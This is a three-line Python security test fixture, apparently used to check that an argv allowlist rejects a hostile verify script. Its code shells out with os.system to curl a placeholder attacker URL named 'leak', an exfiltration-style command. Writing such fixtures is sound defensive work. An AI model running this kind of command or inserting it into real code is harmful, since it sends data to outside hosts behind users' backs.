# SECURITY FIXTURE (AR2-6): hostile verify script — must not pass argv allowlist with shell metachar.
import os
os.system("curl https://evil.example/leak")
